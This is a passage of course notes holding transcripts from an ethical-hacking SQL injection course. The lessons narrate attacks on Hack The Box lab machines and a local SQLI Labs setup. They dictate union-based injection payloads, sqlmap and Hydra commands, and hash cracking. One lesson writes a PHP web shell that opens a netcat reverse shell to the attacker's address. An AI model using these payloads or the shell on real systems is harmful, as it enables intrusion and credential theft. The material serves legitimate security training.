> **[2:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=121)** - T user, and let's dump it. And we'll let MySQL try cracking the hashes and we'll give it user share [word](../../Skills/Cloud%20Computing/Microsoft%20Word.md) lists rock you dot text as its dictionary file. And we get, I miss you as the password. We have Db admin with a password of, I miss you. I've already done some further enumeration of the target and I've found there's a phpMyAdmin page. Let's go to that. Okay. And let's use our credentials login with DB admin and the password of I miss you. And we're in. We can see that we have an [SQL](../../Skills/Data%20Science/SQL.md) panel. We can try select, user comma password from my SQL dot user and we press the go button and we can see we have DB admin and it's stash password. So that worked after a bit of trial and error. We found that we could write into the VAR www [HTML](../../Skills/Web%20Development/HTML.md) folder.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/defeating-the-waf?u=76281980&t=218)** We can now create a PHP shell. We go back to our SQL page and type select PHP system and see minus LP 2, 2, 2, 2 minus E slash bin slash bash, close the PHP and put that into our file Slash bar slash www slash HTML slash Shelley dot PHP, Here we go, and that returned an empty result set, but it worked so it can now run Shelly dot PHP and open up a listener and see ten.ten.ten.one 4 3 2 2 2 2, who am I I'm WW data. And we've been able to get a show from our initial SQL injection.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [PHP](../../Skills/Software%20Development/PHP.md) (7), [MySQL](../../Skills/Software%20Development/MySQL.md) (4), [SQL](../../Skills/Data%20Science/SQL.md) (4), [SQLmap](../../Glossary/Tool/SQLmap.md) (3), [HTML](../../Skills/Web%20Development/HTML.md) (2)
> **Env Vars:** php (7), sql (4), html (2), sqlmap (1), var (1)
> **CLI Commands:** php (7), mysql (4)
> **Code Identifiers:** information_schema (1), performance_schema (1), phpmyadmin (1)
> **UI Navigation:** go to (2), click on (1)
> **Speakers:** - [instructor] (1), - t (1)
> **Versions:** 10.10.10 (1)
> **Cross-References:** go back to (1)

#### [Navigating a complex injection](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=0)** - [Instructor] I'm connected to the Hack the Box testing lab, and we'll do a scan of the server on 10.10.10.31. This is the Charon server, and if you want to feel a hands-on with this, you'll need to be in the Hack The Box lab. Connecting to the site shows what looks like a food-focused website, with a blog. There's no particular areas of interest on the site, but when we carry out our reconnaissance, we find there's a number of additional pages including the CMS data login page. Let's go and take a look at that, /cmsdata/login.[PHP](../../Skills/Software%20Development/PHP.md). We've got a login page here. I won't go through the whole process. But it turns out that this page isn't susceptible to [SQL](../../Skills/Data%20Science/SQL.md) injection. Next, we'll go to the forgot password page. Okay, now we can start to test the page. First, let's see what it does with a random email, a@[b.com](https://b.com). Okay. That gives an email not found, which we'd expect. Now let's try something we know will have an error, if it's passed to the database, a@[b.com](https://b.com), quote. Okay, we get a database error. This means we can get through to the database with an SQL injection. Let's see if we can do a blind SQL attack by using, order by, to check the number of columns, a@[b.com](https://b.com), order by one, and we don't get an error,
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=96)** so let's keep trying. A@[b.com](https://b.com), Order by two.
>
> **[1:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=112)** A@[b.com](https://b.com), order by three. A@[b.com](https://b.com), order by four. A@[b.com](https://b.com), order by five. And we have an error in the database. So, we now know we have four columns, now, let's try to inject via a union, A@[b.com](https://b.com), union select one, two, three, four and we'll send. We get a response from the system in a new page saying, there's an error here. Okay, there's something strange going on. One thing we need to be aware of is that the system may be looking for standard injection codes, such as union select. So, let's modify this a bit. After a few tries, we find we get an incorrect format error if we have mixed case. Union Select. Okay, we can see the message indicates that we're not providing the correct format. Given we have an email addresses input, perhaps one of the columns needs to be in that format also. With a bit of trial and error,
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=205)** we find that it's the fourth column, a@[b.com](https://b.com), union select, one, comma, two, comma, three, comma, a@b.c, a@[b.com](https://b.com), Union Select one, two, three, a@b.c. And we get a valid response from the system saying this, in email, has been sent from parameter four to parameter two. We have to keep column four as email address, but let's try replacing column two, with our user function. A@b.c, union select One, comma, user, comma, three, comma, a@b.c.
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=270)** Okay. Now let's try getting the database, a@[b.com](https://b.com), union select, one, comma, database, comma, three, comma, a@b.c and we're using this super CMS database. So, now we're getting data out of the system. When we try to display the tables using, a@[b.com](https://b.com), Union select, one, comma, table name, comma, three, comma, a@b.c from information schema dot tables, we get an error with user not found with that email. We can postulate that one reason for this might be that we're returning too many table lines, and we need to limit it to just one at a time. So let's try that. A@[b.com](https://b.com) union select, one, comma, table name, comma, three, comma, a@b.c, from information schema dot tables,
>
> **[6:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=368)** limit naught, comma, one. Okay. We'll have the first table name character sets. We can now start incrementing the starting row, and list the tables. It's a long slug through enumerating the database. However, after enumerating all the tables, we find, a@[b.com](https://b.com), union select, one, comma, table name, comma, three, comma a@b.c from information schema dot tables, limit 63, comma, one, but we do find an operator's table. We can now take a look at the columns in the table using a similar technique. A@[b.com](https://b.com), union select, one, comma, column name, comma, three, comma, a@b.c from information schema dot columns, where, table name equal operators, limit zero, comma, one.
>
> **[7:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=468)** And we have an ID similarly, a@[b.com](https://b.com), union select one, comma, column name, comma, three, comma, a@b.c from information schema dot columns, where table name equals operators, limit one, comma, one. And we get underscore, underscore, username, underscore, underscore. And if we did that again for a limit of two, comma, one, we'd get underscore, underscore, username, underscore. So let's now extract them. A@[b.com](https://b.com), union select, one, comma, underscore, underscore, password, underscore, comma three, comma and we'll concat. To concatenate, underscore, underscore user name, underscore, comma at @b.c From operators limit,
>
> **[9:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=563)** naught, comma, one. So, that's a@[b.com](https://b.com), quotes, union select, one, comma, underscore, underscore, password, underscore, three, comma, concat, underscore, underscore, username, underscore, comma, quote @b.c, end bracket from operators, limit naught, not one. And we get test one and a hash, and we can repeat that, with the changing limit, to get all the usernames out. And we find when we do that, we eventually get to, a@[b.com](https://b.com), union select, one, comma, underscore, underscore, password, underscore, comma, three, comma, concat, underscore, underscore, username, underscore, comma @b.c from operators limit 200, comma, one, 200 comma, one. And we find that gives us our super CMS admin user hash. If we take that hash and go into crack station, paste it, and we have the password tomorrow.
>
> **[11:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/navigating-a-complex-injection?u=76281980&t=660)** We can now log into the system. Super, underscore, CMS, underscore, Adam and tomorrow. We've successfully carried out the SQL injection to gain access to the administrator's password.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (4), [PHP](../../Skills/Software%20Development/PHP.md) (1)
> **URLs:** [b.com](https://b.com) (19)
> **File Paths:** b.c (13), cmsdata/login.php (1)
> **CLI Commands:** find (7), php (1)
> **Env Vars:** cms (4), sql (4)
> **Versions:** 10.10.10 (1)
> **UI Navigation:** go to (1)
> **Analogies:** such as (1)

#### [Using request messages to inject SQL](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=0)** - [Narrator] Let's try another of the Hack The Box targets. This one is called Falafel on 10.10.10.73, and it's a falafel lovers website. There's a login page, so let's try that. And let's try. (computer keyboard clattering) Admin, admin, and we get wrong identification. Let's try. (computer keyboard clattering) Guest, guest. And we get, try again. After some experimentation it seems that our guesses for username all get the try again message, except for admin. We can now assume admin is a valid user. We don't have any passwords currently, but let's see if we can find any additional users. We can use [Hydra](../../Glossary/Tool/Hydra.md) for this. I checked the form to see that the two form fields are username and password. We'll use Hydra with pass123 as the password. We're not trying to get a valid password, just identify users. (computer keyboard clattering) Minus P. (computer keyboard clattering) Pass123, just to fix password, but we'll use the, list, file, user, share, [word](../../Skills/Cloud%20Computing/Microsoft%20Word.md) lists, rockyou.txt. We're going to go to 10.10.10.73. It's going to be an http. (computer keyboard clattering) Post-form and it's /login.[PHP](../../Skills/Software%20Development/PHP.md),
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=96)** colon, username equals, caret, USER, for the user from the file and,
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=110)** password equals, affixed caret, pass. And what we're looking for, is a failing message is try again. Okay. Okay, we've quickly found that Chris is a valid username. We could now try Hydra with Chris and try and crack its password. But in fact, when we do that, we don't find it. So let's leave it and see what we can do with an [SQL](../../Skills/Data%20Science/SQL.md) injection. Let's start [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md). (computer mouse clicking) Let's turn off interception. (computer mouse clicking) And we'll add to our scope, 10.10.10.73. Okay. (computer mouse clicking) Okay, we'll set our browser preferences, network settings to manual proxy. Okay. And now let's put in the username Chris and submit. And we get, wrong identification. Let's go to the post message with username as Chris. And let's copy it.
>
> **[3:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=206)** To file, and we'll make the file, Chris.txt.
>
> **[3:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=215)** (computer mouse clicks) Now we can run our SQL map command using the request packet and the value, wrong identification, which indicates a valid response on username. SQL map minus r, chris.txt minus, minus string, wrong identification. (computer keyboard clattering) Okay, we found an injection. We can now run this with the minus, minus DBS switch to get the [Databases](../../Skills/Software%20Development/Databases.md). Minus, minus DBS. And we can see we're retrieving the database names with a blind based timing transaction. Okay. We've recovered two tables, falafel and information_schema. Let's look at the tables in falafel. (computer keyboard clattering) It's D falafel, minus, minus tables. (computer mouse clicks) And we find the user's table. Okay, let's dump it. (computer mouse clicking) Minus T, users and dump. Okay, we've found admin and Chris together with their hashes. And when we use CrackStation, we find Chris's password is Juggling. And as a post script,
>
> **[5:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-request-messages-to-inject-sql?u=76281980&t=309)** our initial Hydra scan also found a username, Sleepy. (computer mouse clicking) And when we use Sleepy, a hacking attempt is detected. I guess this was the honey pot account.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Hydra](../../Glossary/Tool/Hydra.md) (4), [SQL](../../Skills/Data%20Science/SQL.md) (3), [Word](../../Skills/Cloud%20Computing/Microsoft%20Word.md) (1), [PHP](../../Skills/Software%20Development/PHP.md) (1), [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) (1)
> **CLI Commands:** find (4), php (1), make (1)
> **Env Vars:** sql (3), dbs (2), user (1)
> **Non-Speech:** (computer mouse clicking) (5)
> **File Paths:** chris.txt (2), rockyou.txt (1), login.php (1)
> **Definitions:** is a  (3), is called (1)
> **Versions:** 10.10.10 (3)
> **UI Navigation:** go to (2)

#### [Checking out SQLI Labs](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=0)** - [Instructor] Before we finish the course, you may want to set up your own [SQL](../../Skills/Data%20Science/SQL.md) injection lab to deep-dive more advanced SQL injections. There's an interesting set of [PHP](../../Skills/Software%20Development/PHP.md) files which can be used to practice SQL injections, known as the SQLI labs. These have been created by a user called Audi-1. And while the presentation is a bit juvenile, they can be quite useful as a test bed. We'll need to install the latest php7 version of the labs, which we can get from the skyblueee site shown here. Okay, let's install the files. I'm in my var/www/[HTML](../../Skills/Web%20Development/HTML.md) folder and I'll sudo [Git](../../Skills/Software%20Development/Git.md) clone [https://github.com/skyblueee/sqli-labs-php7.git](https://github.com/skyblueee/sqli-labs-php7.git).
>
> **[1:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=64)** And I'll change the folder name to SQLI for ease of use. Sudo mv sqli-labs-php7 sqli.
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=82)** We can now start Apache and [MySQL](../../Skills/Software%20Development/MySQL.md). Service apache2 start && service mysql start.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=101)** We need to set up a user account for the lab. Let's do that. Sudo mysql -u root, and we'll create user 'sqliuser'@;localhost'
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=123)** identified by 'sqluser';,
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=132)** and we'll grant all privileges on *.*
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=144)** to 'sqliuser'@'localhost;.
>
> **[2:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=156)** Okay. We can now update the SQLI lab connection, cd sqli, and we need to go into sql-connections.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=172)** And sudo nano db-creds.inc.
>
> **[3:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=181)** Change our dbuser to 'sqliuser,'
>
> **[3:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=190)** and the db password to 'sqliuser.' Okay, we can now go into the website, 127.0.0.1/sqli.
>
> **[3:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=204)** And we can set up, reset the database for the labs. Okay. That's set up. There are over 60 exercises in total across four pages of basic, advanced, stacked and challenges. And if we scroll down, we'll see the different types of exercises that we can run. Let's start the first exercise, which is to input the ID as parameter with a numeric value. And we'll do that as id=1. And we get the user details for ID one. We can do the same thing with ID two. We get another set of details and we can put in id=3 and we get some more details. Let's go back now to lesson two. We've got the same lesson, but let's add a quote to see what happens. 'id=1', and we have an error in the SQL syntax.
>
> **[4:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=274)** Okay, let's add an inject. So we'll make that equals one or one equals one.
>
> **[4:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=285)** And that works. So now let's try equals one, order by one.
>
> **[4:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=296)** And that works. Order by two, and that works. And order by three, and that works. When we try order by four, we have an unknown column. So we now know that we have three columns in the selection. So let's start to extract information. We'll set id=0 and do a union select,
>
> **[5:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=334)** and we'll select NULL, user and database.
>
> **[5:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-sqli-labs?u=76281980&t=344)** And we've started to extract information. This lab provides the basis of a useful tool for trying out your SQL injections.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (6), [MySQL](../../Skills/Software%20Development/MySQL.md) (3), [Git](../../Skills/Software%20Development/Git.md) (2), [PHP](../../Skills/Software%20Development/PHP.md) (1), [HTML](../../Skills/Web%20Development/HTML.md) (1)
> **CLI Commands:** sudo (4), mysql (3), git (2), php (1), mv (1)
> **Env Vars:** sql (5), sqli (3), php (1), null (1)
> **Prerequisites:** set up (4), install (2)
> **Definitions:** known as (1), is a  (1)
> **URLs:** [https://github.com/skyblueee/sqli-labs-php7.git](https://github.com/skyblueee/sqli-labs-php7.git) (1)
> **Versions:** 127.0.0 (1)
> **Tools:** github (1)


### Conclusion

[↑ Back to Table of Contents](#table-of-contents)

#### [What's next?](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=0)** - [Malcolm] I'd really like to thank you for joining me for this course. I hope you enjoyed learning about how to run [SQL](../../Skills/Data%20Science/SQL.md) injections. This course is an important step along your learning path, which leads to becoming a professional pen tester. Web is a major attack surface, and SQL injections are one of the key web attacks used by cyber criminals and nation state attackers. There's always something new in [Cybersecurity](../../Topics/Cybersecurity.md). And if you're interested in learning more, then check out the full security segment of the library where new courses are added regularly. You'll find courses on all aspects of security. I'd also invite you to go to my author page, where you can find some additional pen testing courses, as well as a wider coverage of cybersecurity. If you want to get hands-on with [Android](../../Glossary/Sdk/Android.md), then do take a look at "Mobile Devices and Platforms," and "Securing Android Apps." If you're wanting to learn about security for the cloud, then "Cybersecurity for [Cloud Computing](../../Topics/Cloud%20Computing.md)" is for you. You'll also find courses on the security aspects of wireless, websites, and the [Internet of Things](../../Skills/Software%20Development/Internet%20of%20Things%20(IoT).md). Thanks again for joining me on this course. And I hope to see you again soon for more courses on pen testing and cybersecurity.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Cybersecurity](../../Topics/Cybersecurity.md) (4), [SQL](../../Skills/Data%20Science/SQL.md) (2), [Android](../../Glossary/Sdk/Android.md) (2), [Cloud Computing](../../Topics/Cloud%20Computing.md) (1), [Internet of things](../../Skills/Software%20Development/Internet%20of%20Things%20(IoT).md) (1)
> **CLI Commands:** find (3)
> **Env Vars:** sql (2)
> **Definitions:** is an  (1), is a  (1)
> **UI Navigation:** go to (1)
> **Speakers:** - [malcolm] (1)


## Instructor

- [Malcolm Shore](../../Instructors/Cybersecurity/Malcolm%20Shore.md)

## Resources

- Exercise files available

## Skills Covered

- SQL Injection
- Ethical Hacking

## Path Context

### In [Become an Ethical Hacker](../../Paths/Cybersecurity/Learning%20Paths/Become%20an%20Ethical%20Hacker.md)
← [Ethical Hacking- Cloud Computing](Ethical%20Hacking-%20Cloud%20Computing.md) | **19 of 19**

## Appears In

- [Become an Ethical Hacker](../../Paths/Cybersecurity/Learning%20Paths/Become%20an%20Ethical%20Hacker.md)

## Related Courses

_Courses sharing skills:_

- [Offensive Penetration Testing](Offensive%20Penetration%20Testing.md) — Ethical Hacking
- [Stealth Penetration Testing with Advanced Enumeration](Stealth%20Penetration%20Testing%20with%20Advanced%20Enumeration.md) — Ethical Hacking
- [Kali Linux for Advanced Pen Testing and Ethical Hacking](Kali%20Linux%20for%20Advanced%20Pen%20Testing%20and%20Ethical%20Hacking.md) — Ethical Hacking
- [Ethical Hacking- Cloud Computing](Ethical%20Hacking-%20Cloud%20Computing.md) — Ethical Hacking
- [Ethical Hacking- Cryptography](Ethical%20Hacking-%20Cryptography.md) — Ethical Hacking

---

[↑ Back to top](#)